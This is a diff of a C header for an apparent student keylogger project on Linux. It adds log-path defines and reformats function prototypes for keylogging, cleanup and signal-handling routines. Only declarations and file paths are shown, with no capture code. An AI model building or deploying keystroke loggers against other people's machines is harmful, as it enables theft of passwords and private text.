@@ -8,11 +8,11 @@
 #include <stdlib.h>
 #include <linux/input.h>
 #include <sys/stat.h>
-
 #include "libft.h"
 
 # define KEYBOARD_CST 0
-# define LOGPATH  "/home/user42/Bureau/keylogger/logs/keylog.log"
+# define LOGPATH	"/home/user42/Bureau/keylogger/logs/"
+# define LOGFILE  "/home/user42/Bureau/keylogger/logs/keylog.log"
 # define DATAPATH "/home/user42/Bureau/keylogger/klg.data"
 
 typedef struct	s_mod
@@ -40,14 +40,12 @@ typedef struct	s_keylogger
 
 }				t_keylogger;
 
-void	clean_quit(t_keylogger *klg, int code);
-int     lentochar(char *s, char c);
-void    ft_putstr(char *s);
-void    ft_putchar(char c);
-void	ft_strncpy(char *dest, char *src, int n);
-void	keylogger(void);
-void    signal_handle();
-t_keylogger *getKlg(void);
+void				clean_quit(t_keylogger *klg, int code);
+int					lentochar(char *s, char c);
+void				ft_strncpy(char *dest, char *src, int n);
+void				keylogger(void);
+void				signal_handle();
+t_keylogger			*getKlg(void);
 
 #include "keymap.h"
 
